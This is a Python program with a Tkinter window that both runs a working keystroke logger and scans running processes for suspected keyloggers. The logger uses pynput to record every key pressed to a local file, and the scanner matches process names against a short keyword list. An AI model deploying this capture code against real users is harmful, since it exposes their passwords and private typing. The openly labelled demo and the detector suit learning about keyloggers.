import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import psutil
from pynput import keyboard

# Global variables
keylogger_active = False
listener = None
log_file = "keylog.txt"

# Keylogger function
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

def start_keylogger():
    global keylogger_active, listener
    if not keylogger_active:
        keylogger_active = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Status: Running", foreground="green")

def stop_keylogger():
    global keylogger_active, listener
    if keylogger_active:
        keylogger_active = False
        if listener:
            listener.stop()
        status_label.config(text="Status: Stopped", foreground="red")

# Function to scan for keyloggers
def scan_for_keyloggers():
    keyword_list = ["keylogger", "pynput", "hook", "keyboard"]
    detected_processes = []

    for process in psutil.process_iter(attrs=['pid', 'name']):
        try:
            process_name = process.info['name'].lower()
            if any(keyword in process_name for keyword in keyword_list):
                detected_processes.append(f"PID: {process.info['pid']} | Name: {process_name}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue  # Ignore processes we can't access

    # Update GUI log
    log_text.config(state=tk.NORMAL)  # Allow editing
    log_text.delete(1.0, tk.END)
    if detected_processes:
        log_text.insert(tk.END, "\n".join(detected_processes))
    else:
        log_text.insert(tk.END, "No keyloggers detected.")
    log_text.config(state=tk.DISABLED)  # Prevent manual edits

# GUI Setup
root = tk.Tk()
root.title("Keylogger & Detector")
root.geometry("500x450")
root.resizable(False, False)

# Styling
style = ttk.Style()
style.configure("TButton", font=("Arial", 12))
style.configure("TLabel", font=("Arial", 12))

# Frame
frame = ttk.Frame(root, padding=10)
frame.pack(fill=tk.BOTH, expand=True)

# Status Label
status_label = ttk.Label(frame, text="Status: Stopped", foreground="red")
status_label.pack(pady=5)

# Buttons
start_button = ttk.Button(frame, text="Start Keylogger", command=lambda: threading.Thread(target=start_keylogger, daemon=True).start())
start_button.pack(pady=5, fill=tk.X)

stop_button = ttk.Button(frame, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=5, fill=tk.X)

scan_button = ttk.Button(frame, text="Scan for Keyloggers", command=scan_for_keyloggers)
scan_button.pack(pady=5, fill=tk.X)

# Log Output
log_text = scrolledtext.ScrolledText(frame, width=60, height=10, state=tk.DISABLED)
log_text.pack(pady=10, fill=tk.BOTH, expand=True)

# Run GUI
root.mainloop()
